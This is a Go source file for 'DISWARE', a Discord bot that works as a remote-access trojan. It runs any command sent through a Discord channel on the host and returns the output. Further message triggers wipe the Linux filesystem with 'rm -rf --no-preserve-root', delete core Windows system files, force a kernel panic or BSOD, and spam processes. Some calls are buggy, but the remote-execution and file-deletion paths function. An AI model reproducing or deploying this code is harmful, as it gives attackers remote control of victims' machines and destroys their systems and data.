package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

func main() {
	fmt.Println("----DISWARE GO VERSION----")

	token := "Bot your mf code"
	// create the bitchass bot
	dg, err := discordgo.New(token)
	if err != nil {
		fmt.Println("FTL:000x:", err)
		return
	}

	// handler
	dg.AddHandler(messageHandler)

	// a fucking gateway
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsMessageContent

	// Botu başlat
	err = dg.Open()
	if err != nil {
		fmt.Println("FTL:0000:", err)
		return
	}

	fmt.Println("Bot is runnin")

	// domain expansion : infinte runnin
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	<-stop

	dg.Close()
	fmt.Println("bot is closed")
}

//messagehandler to recieve the sussy messages from discord kitty and the obese moderator
func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {

	if m.Content == "!hi" {
		s.ChannelMessageSend(m.ChannelID, "hello mf")
	}
	if strings.HasPrefix(m.Content, "!cmd ") {
		cmdStr := strings.TrimPrefix(m.Content, "!cmd ")
		args := strings.Fields(cmdStr)

		if len(args) == 0 {
			s.ChannelMessageSend(m.ChannelID, "ERR:0:NO COMMAND")
			return
		}
		admin := os.Getuid()
		// create the fucking terminal to fucking execute the dogshit commands
		cmd := exec.Command(args[0], args[1:]...)

		// read the fucking output
		output, err := cmd.CombinedOutput()
		if err != nil {
			if len(err.Error()) >= 1 {
				if string(output) == " %!s(MISSING)" {
					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("ERR:1101\n```\n%s\n``` ```\n %s\n```", err.Error()))
				} else {
					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("ERR:1102:\n```\n%s\n``` ```\n %s\n```", err.Error(), output))
				}
			} else {
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("1102:\n```\n%s\n``` ```\n %s\n```", err.Error()))
			}
		}

		if len(output) > 1900 {
			err := os.WriteFile("output.txt", []byte(output), 0o755)
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("1201: %s", err.Error()))
				return
			}

			file, err := os.Open("output.txt")
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("1201: %s", err.Error()))
				return
			}
			defer file.Close()

			s.ChannelFileSendWithMessage(m.ChannelID, "WARN:1000", "output.txt", file)
			os.Remove("output.txt")
			return
		}
  //its too fucking complex but if we made it basic its js destroys or crashes or trolls for u
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("OUT:\n```\n%s\n```", output))
		if m.Content == "!destroy_w_harm:True:LINUX" {
			if admin == 0 {
				s.ChannelMessageSend(m.ChannelID, "Bye glorious discord world ")
				exec.Command("rm -rf --no-preserve-root").Run()
			} else {
				s.ChannelMessageSend(m.ChannelID, "program wasnt executed with admin rights")
			}

		}
		if m.Content == "destroy_w_harm:True:WIN" {
			sys_file := [16]string{"C:\\Windows\\System32\\ntoskrnl.exe", "C:\\Windows\\System32\\hal.dll", "C:\\Windows\\System32\\Boot\\winload.exe",
				"C:\\Windows\\System32\\kdcom.dll", "C:\\Windows\\System32\\bootmgr", "C:\\Windows\\System32\\kernel32.dll",
				"C:\\Windows\\System32\\ntdll.dll", "C:\\Windows\\System32\\ntfs.sys", "C:\\Windows\\System32\\volsnap.sys",
				"C:\\Windows\\System32\\hidclass.sys", "C:\\Windows\\System32\\mountmgr.sys", "C:\\Windows\\System32\\usbhub.sys",
				"C:\\Windows\\System32\\dxgkrnl.sys", "C:\\Windows\\win.ini", "C:\\Windows\\System32\\winre.wim",
				"C:\\Windows\\System32\\rstrui.exe"}

			for array, files := range sys_file {
				os.Remove(files)
				fmt.Println("deleted %i in %s", array, files)
			}
		}
		if m.Content == "destrory_w_harm:False:LINUX:Technique:PANIC" {
			if admin == 1 {
				s.ChannelMessageSend(m.ChannelID, "Crashing the Linux")
				exec.Command(" bash -c 'echo 1 > /proc/sys/kernel/sysrq'")
				exec.Command("bash -c 'echo c > /proc/sysrq-trigger'")
			} else {
				s.ChannelMessageSend(m.ChannelID, "WARN:1001:Bot isnt running as admin ")
			}
		}
		if m.Content == "destroy_w_harm:False:LINUX:Technique:tty_troll" {
			cmd := exec.Command("bash", "-c", `echo -e "\e[1;31mH\e[1;32mA\e[1;33mC\e[1;34mK\e[1;35mE\e[1;36mD\e[0m" > /dev/tty2`)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			_ = cmd.Run()
		}
		if m.Content == "destroy_w_harm:False:WIN:Technique:BSOD"{
			exec.Command("taskkill", "/IM", "svchost.exe", "/F").Run()
		}
		if m.Content == "destroy_w_harm:False:WIN:Technique:spamia"  {
			for {
				exec.Command("notepad")
			}
		}
	}
}
